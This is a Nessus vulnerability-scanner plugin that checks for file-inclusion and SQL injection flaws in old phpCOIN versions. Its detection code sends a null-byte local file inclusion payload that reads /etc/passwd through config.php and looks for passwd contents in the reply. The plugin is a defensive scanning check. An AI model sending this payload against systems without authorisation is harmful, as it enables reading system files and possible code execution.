#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(20300);
  script_version("$Revision: 1.21 $");

  script_cve_id("CVE-2005-4211", "CVE-2005-4212", "CVE-2005-4213");
  script_bugtraq_id(15830, 15831);
  script_osvdb_id(21724, 21725, 57538);
  
  script_name(english:"phpCOIN < 1.2.2 2005-12-13 Fix-File Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in phpCOIN < 1.2.2 2005-12-13 fix-file");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
several vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running phpCOIN, a software package for
web-hosting resellers to handle clients, orders, helpdesk queries, and
the like. 

The version of phpCOIN installed on the remote host fails to sanitize
user-supplied input to the '_CCFG[_PKG_PATH_DBSE]' parameter of the
'config.php' script before using it in a PHP 'require_once' function. 
Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit this flaw to read
arbitrary files on the remote host and/or run arbitrary code, possibly
taken from third-party hosts, subject to the privileges of the web
server user id. 

In addition, the application uses the 'phpcoinsessid' cookie for
database queries in the 'coin_cfg.php' script without sanitizing it,
which opens the application up to SQL injection attacks provided PHP's
'magic_quotes_gpc' setting is disabled." );
 # https://web.archive.org/web/20120402161859/http://retrogod.altervista.org/phpcoin122.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?45852225");
 script_set_attribute(attribute:"see_also", value:"http://forums.phpcoin.com/index.php?showtopic=5469");
 script_set_attribute(attribute:"solution", value:
"Upgrade to 1.2.2 with the 2005-12-13 fix-file or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/12/14");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/12/12");
 script_cvs_date("$Date: 2017/04/25 14:31:38 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:coinsoft_technologies:phpcoin");
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# Loop through directories.
if (thorough_tests) dirs = list_uniq("/phpcoin", cgi_dirs());
else dirs = make_list(cgi_dirs());

# There's a problem if...
# there's an entry for root or...
# we get an error saying "failed to open stream" or "failed opening".
re = "(root:.*:0:[01]:)|(/etc/passwd.+failed to open stream)|(Failed opening required '/etc/passwd)";

test_cgi_xss(port: port, cgi: "/config.php", dirs: dirs, pass_re: re,
  high_risk: 1, sql_injection: 1,
  qs: "_CCFG[_PKG_PATH_DBSE]=/etc/passwd%00");
